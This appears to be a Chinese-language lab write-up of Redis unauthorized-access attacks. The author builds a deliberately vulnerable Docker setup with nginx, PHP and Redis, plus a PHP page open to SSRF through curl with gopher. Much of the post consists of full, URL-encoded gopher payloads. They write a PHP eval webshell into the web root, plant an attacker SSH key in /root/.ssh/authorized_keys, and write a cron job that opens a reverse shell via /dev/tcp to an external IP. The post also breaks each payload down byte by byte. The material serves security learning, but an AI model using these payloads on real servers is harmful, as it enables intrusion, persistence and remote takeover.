# Redis上

作为高速缓存的数据库类型，其存在的意义是为了缓解Mysql这种固态硬盘的压力，读取操作在内存上时明显比硬盘快的

常见的流程就是用户需要访问数据库内容，服务器先看redis内存里面有没有，没有就再从硬盘里面读取

redis默认端口为6379

如果运维人员没有配置密码，这是很常见的行为，就存在redis未授权漏洞或者是弱密码，一旦存在十分危险，据我经验凭这一点就可以完全拿下这个服务器，而且这个洞很多很常见

## redis配置

用docker拉一个redis 6.2.14![image-20251130202534389](/posts/redis1/image-20251130202534389.png)

配置redis.config![image-20251130203518199](/posts/redis1/image-20251130203518199.png)

网上复制的redis配置信息，文章中间遇到了在讲这些配置的具体作用

```
#hihihiha

# Redis服务器配置 
 
# 绑定IP地址
#解除本地限制 注释bind 127.0.0.1  
#bind 127.0.0.1  
 
# 服务器端口号  
port 6379 
 
#配置密码，不要可以删掉
requirepass 123456  
 
 
#这个配置不要会和docker -d 命令 冲突
# 服务器运行模式，Redis以守护进程方式运行,默认为no，改为yes意为以守护进程方式启动，可后台运行，除非kill进程，改为yes会使配置文件方式启动redis失败，如果后面redis启动失败，就将这个注释掉
daemonize no
 
#当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定(自定义)
#pidfile /data/dockerData/redis/run/redis6379.pid  
 
#默认为no，redis持久化，可以改为yes
appendonly yes
 
 
#当客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能
timeout 60
# 服务器系统默认配置参数影响 Redis 的应用
maxclients 10000
tcp-keepalive 300
 
#指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合（分别表示900秒（15分钟）内有1个更改，300秒（5分钟）内有10个更改以及60秒内有10000个更改）
save 900 1
save 300 10
save 60 10000
 
# 按需求调整 Redis 线程数
tcp-backlog 511
 
 
 
  
 
 
# 设置数据库数量，这里设置为16个数据库  
databases 16
 
 
 
# 启用 AOF, AOF常规配置
appendonly yes
appendfsync everysec
no-appendfsync-on-rewrite no
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
 
 
# 慢查询阈值
slowlog-log-slower-than 10000
slowlog-max-len 128
 
 
# 是否记录系统日志，默认为yes  
syslog-enabled yes  
 
#指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose
loglevel notice
  
# 日志输出文件，默认为stdout，也可以指定文件路径  
logfile stdout
 
# 日志文件
#logfile /var/log/redis/redis-server.log
 
 
# 系统内存调优参数   
# 按需求设置
hash-max-ziplist-entries 512
hash-max-ziplist-value 64
list-max-ziplist-entries 512
list-max-ziplist-value 64
set-max-intset-entries 512
zset-max-ziplist-entries 128
zset-max-ziplist-value 64
```

创建redis数据库目录![image-20251130204222433](/posts/redis1/image-20251130204222433.png)

启动容器

```
docker run -d \
  --name redis6.2.14 \  # 容器名称，自定义（后续管理用）
  --restart=always \    # 开机自启，防止服务器重启容器停掉
  -p 6379:6379 \        # 端口映射（宿主机6379 → 容器6379）
  # 挂载你的配置文件（对应你修正后的redis.conf路径）
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  # 挂载数据目录（持久化文件存在这里，防止数据丢失）
  -v /data/dockerData/redis/data:/data \
  redis:6.2.14 \        # 你已拉取的Redis 6.2.14镜像
  redis-server /etc/redis/redis.conf  # 指定用挂载的配置文件启动
  
  docker run -d \
  --name redis6.2.14 \
  --restart=always \
  -p 6379:6379 \
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  -v /data/dockerData/redis/data:/data \
  redis:6.2.14 \
  redis-server /etc/redis/redis.conf
```

遇到一个小问题，之前的hfish蜜罐还在着呢，关了重开![image-20251130204609089](/posts/redis1/image-20251130204609089.png)![image-20251130210424292](/posts/redis1/image-20251130210424292.png)

终于![image-20251130211019443](/posts/redis1/image-20251130211019443.png)![image-20251130213110039](/posts/redis1/image-20251130213110039.png)

一个redis服务就搭建好了，如果是真实环境不用docker的话，注意别用root权限去搭建，后面再说其危害

进入容器

```
docker exec -it redis6.2.14 /bin/bash

kali本地连接
└─# redis-cli -h 127.0.0.1 -p 6379 -a 123456
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> 
如果是其他公网IP，没有设置密码，且可以公网访问，这句话就直接连接了
```

## redis服务简介

非关系型数据库，存储简单的数据，仅键与值，不像mysql，又是表又是键又是库的，redis就是简简单单的键值对，好像说mysql最后存储的也是键值对![image-20251130213939347](/posts/redis1/image-20251130213939347.png)![image-20251130214252756](/posts/redis1/image-20251130214252756.png)

查看存储数据何处![image-20251130214824863](/posts/redis1/image-20251130214824863.png)![image-20251130214934873](/posts/redis1/image-20251130214934873.png)

Redis 只认「RESP 协议格式」的命令（否则报`invalid multibulk length`），这个协议的核心规则是：

1. **数组开头用`\*N`**：`*`表示 “后面是数组”，`N`是数组内的参数个数（比如`*4`表示后面有 4 个参数）；
2. **字符串开头用`$M`**：`$`表示 “后面是字符串”，`M`是字符串的字节长度（比如`$6`表示后面的字符串长度是 6）；
3. **字段分隔用`\r\n`**：每个`*N`、`$M`、字符串内容后，必须用`\r\n`（URL 编码后是`%0D%0A`）分隔；
4. **命令是 “数组格式”**：Redis 的命令（比如`config set dir /var/www/html`）会被包装成数组：`[config, set, dir, /var/www/html]`，对应`*4`（4 个参数）。

对于redis服务操作又很多，先说三个基础的操作

webshell写入（若redis与web服务在同一主机），定时任务执行反弹shell，ssh公私钥写入

## redis接入web应用

实验：建立一个nginx，php，redis服务的docker网络，测试redis服务的漏洞

启动docker的redis服务

```
  docker run -d \
  --name redis6.2.14 \
  --restart=always \
  -p 6379:6379 \
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  -v /data/dockerData/redis/data:/data \
  -v /docker/webtest/redis/html:/var/www/html \
  --network redis-nginx-net \
  redis:6.2.14 \
  redis-server /etc/redis/redis.conf
```

nginx配置，目录我自己改到了docker文件夹里面![image-20251201192002967](/posts/redis1/image-20251201192002967.png)

```
server {
    listen 80;
    server_name localhost;

    # 网站根目录（需和PHP-FPM挂载的目录一致）
    root /var/www/html;
    index index.php index.html;

    # 解析PHP请求：转发到PHP-FPM容器（容器名:9000，PHP-FPM默认端口）
    location ~ \.php$ {
        fastcgi_pass php-fpm:9000; # PHP-FPM容器名（同一网络可直接访问）
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

docker启动nginx和php环境

```bash
docker run -d \
  --name php-fpm \  # 容器名（Nginx配置中要对应这个名称）
  --network redis-nginx-net \  # 加入和Redis、Nginx相同的网络
  -v ~/web/html:/var/www/html \  # 本地代码目录 → 容器/var/www/html
  --restart=always \
  php:7.4-fpm
  
  docker run -d \
  --name php-fpm \
  --network redis-nginx-net \
  -v ~/web/html:/var/www/html \
  --restart=always \
  php:7.4-fpm
  
  
  docker run -d \
  --name my-nginx \
  --network redis-nginx-net \  # 加入和Redis、PHP-FPM相同的网络
  -p 80:80 \  # 主机80端口映射到Nginx容器80端口
  # 挂载你的本地网页目录 → 容器/var/www/html
  -v /docker/webtest/redis/html:/var/www/html \
  # 挂载你的本地Nginx配置 → 覆盖容器默认配置
  -v /docker/webtest/redis/nginx-conf/default.conf:/etc/nginx/conf.d/default.conf \
  --restart=always \
  nginx:latest  # 改用官方nginx镜像
```

完整指令

```
docker stop my-nginx
docker stop php-fpm
docker stop redis6.2.14
docker rm my-nginx
docker rm php-fpm
docker rm redis6.2.14
docker network rm redis-nginx-net
docker network create redis-nginx-net

docker run -d \
  --name php-fpm \
  --network redis-nginx-net \
  -v /docker/webtest/redis/html:/var/www/html \
  --restart=always \
  php:7.4-fpm

docker run -d \
  --name my-nginx \
  --network redis-nginx-net \
  -p 80:80 \
  -v /docker/webtest/redis/html:/var/www/html \
  -v /docker/webtest/redis/nginx-conf/default.conf:/etc/nginx/conf.d/default.conf \
  --restart=always \
  nginx:latest
  
    docker run -d \
  --name redis6.2.14 \
  --restart=always \
  -p 6379:6379 \
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  -v /data/dockerData/redis/data:/data \
  -v /docker/webtest/redis/html:/var/www/html \
  --network redis-nginx-net \
  redis:6.2.14 \
  redis-server /etc/redis/redis.conf
```

配置完毕，启动！！！

**两个容器就像 “两个独立的电脑”，只是通过 “U 盘（共享挂载目录）” 共享了同一个文件目录，但 “电脑本身的系统、软件、功能完全不同”**。![image-20251201193118928](/posts/redis1/image-20251201193118928.png)![image-20251201195243565](/posts/redis1/image-20251201195243565.png)

简单写一个redis的靶场

实际这是我第一次自己搭建靶场，配的很烂，好在最后还是运行起来了，docker+nginx+redis+PHP，历经千辛万苦，主要就是这个挂载目录，容器名与配置文件，搅成一团，烂是烂，但还是跑起来了，不敢动他了

中间好像有个redis配置的protect-mode的问题，以及redis挂载目录，中间检查redis是否与web建立连接，排查的有点久

但是最后还是没有实现用gopher://127.0.0.1这种方式，好像要涉及到全解析，怕了，有机会再弄，我怕又哪里不对，搞坏了

下面给出源码

```php
<?php
error_reporting(0);
$res = '';
if (isset($_REQUEST['url'])) {
    $ch = curl_init($_REQUEST['url']);
    curl_setopt_array($ch, [
        CURLOPT_HEADER => 0,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_RETURNTRANSFER => 1  // 仅添加这一行：强制curl返回响应内容（原始代码缺失）
    ]);
    ob_start();
    curl_exec($ch);
    $res = ob_get_clean();
    curl_close($ch);
}
?>

<form method="get">
    <input name="url" placeholder="输入URL（支持gopher/http/file）" value="<?=htmlspecialchars($_REQUEST['url']??'')?>">
    <button type="submit">发送</button>
</form>

<?php if ($res): ?>
<pre><?=htmlspecialchars($res)?></pre>
<?php endif; ?>

```

![image-20251202004533919](/posts/redis1/image-20251202004533919.png)

这就是一个CTFhub上存在很明显的redis漏洞的靶场，我把源码薅过来了然后根据我自己的配置改好了

## webshell写入

先介绍gopher协议，以及gopher协议应用场景，为什么支持与Redis连接

### Gopher协议

gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。
它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。
gopher 协议使用tcp 可靠连接。

**核心特性（决定了它的后续应用场景）：**

1. **格式极简**：没有 HTTP 那样复杂的请求头（如 `Host`、`User-Agent`），仅需「协议标识 + 目标地址 + 端口 + 原始数据」即可通信；
2. **明文传输**：所有数据以原始字节流形式在 TCP 端口上传输，不加密、不修改；
3. **支持任意 TCP 端口**：可直接向目标服务器的任意开放 TCP 端口发送数据（如 Redis 的 6379、MySQL 的 3306、SSH 的 22 等）；
4. **“数据直达”**：Gopher 协议的核心是「传递原始数据」，不解析数据内容，仅负责把 `gopher://` 中指定的 “数据段” 转发到目标端口。

简单类比：Gopher 就像「TCP 数据的快递员」—— 你把要发送的原始数据（比如 Redis 命令）交给它，它直接送到目标服务器的指定端口，中间不拆包、不修改。

- Gopher 协议的本质：**TCP 原始数据的 “纯转发工具”**，无额外解析逻辑；
- Redis 的通信本质：**TCP 端口上的 “RESP 协议字节流解析器”**，只要数据格式正确就执行；
- 两者兼容的关键：Gopher 能 “原封不动” 地把 RESP 命令（Redis 能识别的格式）通过 TCP 发给 6379 端口，中间无任何阻碍。

除了Redis之外，Gopher也可以与Mysql，FTP等端口进行通信进行测试

这是Web通过redis服务写入shell的基本原理，比较好理解

先直接给出payload

CTFhub原题的payload是这个

```bash
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

二次url解码

```
gopher://127.0.0.1:6379/_*1
$8
flushall
*3
$3
set
$1
1
$32


<?php @eval($_POST['c']); ?>


*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$9
shell.php
*1
$4
save


```

这个其实在当初招新的时候就见过了，壳师傅出的，那个不是未授权，有密码但是有个任意文件读取可以翻出来，当时那个payload我现在还留着

这是个写入webshell的payload

```py
gopher://127.0.0.1:6379/_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252413%250D%250AYulinSec2025!%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527webshell%2527%255D%2529%253B%2520%253F%253E%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25247%250D%250Aweb.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

我这个可以直接在输入框里面输入，不用二次编码，浏览器会直接做二次编码，后端有解析两次，抵消了

```
gopher://172.17.0.1:6379/_*1%0D%0A$4%0D%0APING%0D%0A
gopher://172.22.0.4:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$32%0D%0A<?php @eval($_POST["c"]); ?>%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A
gopher://172.17.0.1:6379/_*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$9
shell.php
*3
$3
set
$1
1
$32
<?php @eval($_POST["c"]); ?>
*1
$4
save

```

说说这个语法规则

### 逐段拆解 payload 的含义（对应 Redis 命令）

payload 的核心部分是`_`后面的内容（已还原`%0D%0A`为`\r\n`，方便理解）：

```plaintext
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n*3\r\n$3\r\nset\r\n$1\r\n1\r\n$32\r\n<?php @eval($_POST["c"]); ?>\r\n*1\r\n$4\r\nsave\r\n
```

按 RESP 协议规则，拆成 4 个独立的 Redis 命令

**第一段：`config set dir /var/www/html`（设置数据存储目录）**

对应 payload 片段：`*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n`

| 协议字段               | 含义                                                         |
| ---------------------- | ------------------------------------------------------------ |
| `*4`                   | 数组有 4 个参数：`config`（命令）、`set`（子命令）、`dir`（配置项）、`/var/www/html`（目录值） |
| `$6\r\nconfig`         | 字符串`config`的长度是 6（`$6`），后面跟字符串内容 +`\r\n`分隔 |
| `$3\r\nset`            | 字符串`set`的长度是 3（`$3`），后面跟内容 +`\r\n`            |
| `$3\r\ndir`            | 字符串`dir`的长度是 3（`$3`），后面跟内容 +`\r\n`            |
| `$13\r\n/var/www/html` | 字符串`/var/www/html`的长度是 13（`$13`），后面跟目录路径 +`\r\n` |

作用：告诉 Redis“把数据存储目录设置为`/var/www/html`”（这个目录和 Nginx 共享，写的文件能通过 Web 访问）。

**第二段：`config set dbfilename shell.php`（设置数据文件名）**

对应 payload 片段：`*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n`

| 协议字段            | 含义                                                         |
| ------------------- | ------------------------------------------------------------ |
| `*4`                | 数组有 4 个参数：`config`、`set`、`dbfilename`（配置项）、`shell.php`（文件名） |
| `$10\r\ndbfilename` | 字符串`dbfilename`的长度是 10（`$10`），后面跟内容 +`\r\n`   |
| `$9\r\nshell.php`   | 字符串`shell.php`的长度是 9（`$9`），后面跟文件名 +`\r\n`    |

作用：告诉 Redis“把数据文件命名为`shell.php`”（默认是`dump.rdb`，改成 php 文件才能被 Web 解析）。

**第三段：`set 1 "<?php @eval($_POST['c']); ?>"`（写入一句话木马）**

对应 payload 片段：`*3\r\n$3\r\nset\r\n$1\r\n1\r\n$32\r\n<?php @eval($_POST["c"]); ?>\r\n`

| 协议字段                              | 含义                                                         |
| ------------------------------------- | ------------------------------------------------------------ |
| `*3`                                  | 数组有 3 个参数：`set`（命令）、`1`（键名）、`一句话木马`（键值） |
| `$1\r\n1`                             | 字符串`1`的长度是 1（`$1`），后面跟键名 +`\r\n`              |
| `$32\r\n<?php @eval($_POST["c"]); ?>` | 一句话木马的长度是 32（`$32`），后面跟木马内容 +`\r\n`（长度必须精确匹配，多 1 个空格都报错） |

作用：往 Redis 中写入一个键值对，键是`1`，值是 PHP 一句话木马（后续`save`命令会把这个键值对写入`shell.php`）。

**第四段：`save`（保存数据到文件）**

对应 payload 片段：`*1\r\n$4\r\nsave\r\n`

| 协议字段     | 含义                                                   |
| ------------ | ------------------------------------------------------ |
| `*1`         | 数组有 1 个参数：`save`（命令本身）                    |
| `$4\r\nsave` | 字符串`save`的长度是 4（`$4`），后面跟命令内容 +`\r\n` |

作用：触发 Redis 把内存中的数据（包括刚才写入的木马）保存到`dir`指定的目录，生成`dbfilename`指定的`shell.php`文件。

**四、URL 编码的作用（为什么需要`%0D%0A`）**

原始的 RESP 协议需要`\r\n`分隔字段，但`\r\n`是不可见字符，无法直接放在 URL 中传输（浏览器会解析错误）。所以需要把`\r\n`转换成 URL 编码的`%0D%0A`，这里要特别注意，不过好像写好resp格式在Burp里面url编码也行

![image-20251202091652660](/posts/redis1/image-20251202091652660.png)

写入shell过后，就是正常的连接了，但连接之后仍然存在限制，关于redis的命令执行后文讲，如果成功写入webshell，剩下的就是在Linux主机进行提权等操作了

![image-20251202005348298](/posts/redis1/image-20251202005348298.png)



## SSH写入

如果对方开启了ssh服务，在对方主机写入公钥，我们自己的私钥去登录，而且需要你有root权限才能在root目录里面写入公钥

如果是权限管理的很好的场景，redis就是redis用户搭建的而不是root搭建的，那这个就没辙了，写不进去

但我是docker的root，无所谓随便打

### 公钥写入原理

如果我们有对方的redis有root权限，可以在/root/.ssh/中写入文件，我们利用ssrf+gopher+redis的写入文件的能力，在其中写入自己的公钥，利用对方主机开启的ssh服务连接，成了就直接root，适用于不是webshell，或者webshell没用的场景

实验：redis主机中配置ssh并ssrf登录

redis中配置ssh登录

![image-20251202101114562](/posts/redis1/image-20251202101114562.png)

配置允许密码，公钥登入

![image-20251202100026662](/posts/redis1/image-20251202100026662.png)

redis容器配置密码

![image-20251202100301210](/posts/redis1/image-20251202100301210.png)

重启redis服务，加入ssh端口映射

```
docker run -d \
  --name redis6.2.14 \
  --restart=always \
  -p 6379:6379 \  # 原有Redis端口映射
  -p 2222:22 \     # 新增SSH端口映射（宿主机2222 → 容器22）
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  -v /data/dockerData/redis/data:/data \
  -v /docker/webtest/redis/html:/var/www/html \
  --network redis-nginx-net \
  redis:6.2.14 \
  redis-server /etc/redis/redis.conf
  
  docker run -d \
  --name redis6.2.14 \
  --restart=always \
  -p 6379:6379 \
  -p 2222:22 \
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  -v /data/dockerData/redis/data:/data \
  -v /docker/webtest/redis/html:/var/www/html \
  --network redis-nginx-net \
  redis:6.2.14 \
  redis-server /etc/redis/redis.conf
```

这里顺序有点小问题，应该是先开启端口在配置ssh，导致我又重复了一遍，ssh服务开启（ssh服务也有很大的学问呢）

我的虚拟机ip是172.22.0.4

![image-20251202134732262](/posts/redis1/image-20251202134732262.png)

接下来就该尝试ssrf写入公钥了

现在kali本机生成公私钥对

![image-20251202135440259](/posts/redis1/image-20251202135440259.png)

拿着生成的公钥构造paylaod

```
gopher://172.17.0.1:6379/_*4
$6
config
$3
set
$3
dir
$11
/root/.ssh/
*4
$6
config
$3
set
$10
dbfilename
$15
authorized_keys
*3
$3
set
$1
1
$572


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSlmOylI0lySZfECRH/HwFEx25MwCTonyIJ0057V8QvkdVsQgjyyaOCe3oh9vx0KuXMFvxvhkLDLYK4ZRfLv2bybkVS1B/v3wkMdmYjhfUXrJaMfFk9KA1/v+wOGVBr0jCbTdC//IigNgg8/zsyQYrfmoSSxJ16tlpXLu04S0sdpwubCAFKx05x2vToh2ZdJQboP5KVyCdCmo3ICpX0zfX9PDfTmQokcnshsP4p+dIGX/5OdsFA86ju8y+aF8jaODQsXf179+/UNBLx7xqinh1JTNl7za58ms5fsP+k6D7S767OqnDbqmUU4ntxO/T2unxSF57oIGv4moWAx/CgQoDZkShtPyiSGYvtvuI+hYdt+eT3x1JuGJwyhI77kuZVqzIfoJ/As6bBw3m5fOKiPBHDxxed4SfjRoHSeoM4iHhlRy1v/GeZJZqphtj6tZOsAMu8SQ+6oUtnggR5NUtUSf1P7TF1tMTCU4/z9zSlMACOZFcYvzmIS8rMYhohSJW04c= root@kali


*1
$4
save

gopher://172.22.0.4:6379/_*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2411%0d%0a%2froot%2f.ssh%2f%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%2415%0d%0aauthorized_keys%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%24568%0d%0a%0d%0a%0d%0assh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABgQCSlmOylI0lySZfECRH%2fHwFEx25MwCTonyIJ0057V8QvkdVsQgjyyaOCe3oh9vx0KuXMFvxvhkLDLYK4ZRfLv2bybkVS1B%2fv3wkMdmYjhfUXrJaMfFk9KA1%2fv+wOGVBr0jCbTdC%2f%2fIigNgg8%2fzsyQYrfmoSSxJ16tlpXLu04S0sdpwubCAFKx05x2vToh2ZdJQboP5KVyCdCmo3ICpX0zfX9PDfTmQokcnshsP4p+dIGX%2f5OdsFA86ju8y+aF8jaODQsXf179+%2fUNBLx7xqinh1JTNl7za58ms5fsP+k6D7S767OqnDbqmUU4ntxO%2fT2unxSF57oIGv4moWAx%2fCgQoDZkShtPyiSGYvtvuI+hYdt+eT3x1JuGJwyhI77kuZVqzIfoJ%2fAs6bBw3m5fOKiPBHDxxed4SfjRoHSeoM4iHhlRy1v%2fGeZJZqphtj6tZOsAMu8SQ+6oUtnggR5NUtUSf1P7TF1tMTCU4%2fz9zSlMACOZFcYvzmIS8rMYhohSJW04c%3d+root%40kali%0d%0a%0d%0a%0d%0a*1%0d%0a%244%0d%0asave%0d%0a
```

但是好像失败了，这个key被写到了`/var/www/html`下面，下面是其原因

Redis 官方镜像默认以 **`redis`普通用户**启动服务（即使你用`root`进入容器，Redis 进程本身还是`redis`用户）。而`/root/.ssh`是`root`用户的专属目录（权限默认是`700`，仅 root 可读写），`redis`用户没有访问 / 写入权限，所以`config set dir /root/.ssh`会**静默失败 **，Redis 会继续使用默认工作目录（你挂载的`/var/www/html`），最终把`authorized_keys`写到了这个目录。

![image-20251202170444771](/posts/redis1/image-20251202170444771.png)

重启一下，以root权限启动

```
docker run -d \
  --name redis6.2.14 \
  --user root \
  --restart=always \
  -p 6379:6379 \
  -p 2222:22 \
  -v /data/dockerData/redis/conf/redis.conf:/etc/redis/redis.conf \
  -v /data/dockerData/redis/data:/data \
  -v /docker/webtest/redis/html:/var/www/html \
  --network redis-nginx-net \
  redis-ssh-root:v1 \
  su root -c "redis-server /etc/redis/redis.conf"
```

![image-20251202170648496](/posts/redis1/image-20251202170648496.png)

这次再试试payload

成功写入key

![image-20251202170824260](/posts/redis1/image-20251202170824260.png)

最后用这个payload成功了，在此前的基础先清理一遍,flushall一下，注意中间你内容长度

总字节数 = 公钥前空行（4） + 公钥本身（564） + 公钥后空行（4） = 572 字节 → 所以 RESP 协议中写 `$572`。

```
gopher://172.22.0.4:6379/_flushall%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A%2froot%2f.ssh%2f%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A*3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24572%0D%0A%0D%0A%0D%0Assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSlmOylI0lySZfECRH%2fHwFEx25MwCTonyIJ0057V8QvkdVsQgjyyaOCe3oh9vx0KuXMFvxvhkLDLYK4ZRfLv2bybkVS1B%2fv3wkMdmYjhfUXrJaMfFk9KA1%2fv%2bwOGVBr0jCbTdC%2f%2fIigNgg8%2fzsyQYrfmoSSxJ16tlpXLu04S0sdpwubCAFKx05x2vToh2ZdJQboP5KVyCdCmo3ICpX0zfX9PDfTmQokcnshsP4p%2bdIGX%2f5OdsFA86ju8y%2baF8jaODQsXf179%2b%2fUNBLx7xqinh1JTNl7za58ms5fsP%2bk6D7S767OqnDbqmUU4ntxO%2fT2unxSF57oIGv4moWAx%2fCgQoDZkShtPyiSGYvtvuI%2bhYdt%2beT3x1JuGJwyhI77kuZVqzIfoJ%2fAs6bBw3m5fOKiPBHDxxed4SfjRoHSeoM4iHhlRy1v%2fGeZJZqphtj6tZOsAMu8SQ%2b6oUtnggR5NUtUSf1P7TF1tMTCU4%2fz9zSlMACOZFcYvzmIS8rMYhohSJW04c%3d root%40kali%0D%0A%0D%0A*1%0D%0A%244%0D%0Asave
```

![image-20251202172957532](/posts/redis1/image-20251202172957532.png)

## 计划任务反弹shell

![image-20251202200508593](/posts/redis1/image-20251202200508593.png)

```
gopher://172.22.0.4:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2424%0D%0A%2fvar%2fspool%2fcron%2fcrontabs%2f%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2479%0D%0A%0D%0A%0D%0A%2a%20%2a%20%2a%20%2a%20%2a%20%2fbin%2fbash%20-c%20%27%2fbin%2fbash%20%3e%26%20%2fdev%2ftcp%2f47.108.128.134%2f7777%200%3e%261%27%0D%0A%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

echo '* * * * * /bin/bash -c "/bin/bash >& /dev/tcp/47.108.128.134/7777 0>&1"' > root

set shell "\n\n\n* * * * * bash -i >& /dev/tcp/47.108.128.134/7777 0>&1\n\n\n"
set shell '* * * * * /bin/bash -c "/bin/bash >& /dev/tcp/47.108.128.134/7777 0>&1"'
```

手工测试cron计划任务是执行了，我的服务器成功反弹了shell

![image-20251202203703571](/posts/redis1/image-20251202203703571.png)

![image-20251202220929620](/posts/redis1/image-20251202220929620.png)

尝试paylaod版本

我真蚌埠住了，搞不来了，和之前两个一模一样的东西死活不会执行计划任务，就已经完完全全写进去了指令，但是cron任务可能就是因为这个冗余的信息，无法执行指令，可能别的操作系统可以吧，但我的docker死活不行，这玩意搞了我一个晚上，放弃了

![image-20251202220544684](/posts/redis1/image-20251202220544684.png)

下面是成功写入的paylaod，哭了，计划任务你为什么不计划

```
gopher://172.22.0.4:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2424%0D%0A%2fvar%2fspool%2fcron%2fcrontabs%2f%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0D%0A%0D%0A* * * * * /bin/bash -c 'sh >& /dev/tcp/47.108.128.134/7777 0>&1'%0D%0A%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```



**写在最后**

后面还会写点Vulhub 靶场上的redis，以及redis的模块加载实现rce，主从复制的姿势

本章是我自己搭建docker进行的复现，为了方便就纯粹的没设置密码，正常情况做好安全是肯定要设置强密码的，但主要是从三个角度分析redis的利用手段，docker的东西还是学了不少

![image-20251130201529390](/posts/redis1/image-20251130201529390.png)



![image-20251205101217292](/posts/redis1/image-20251205101217292.png)

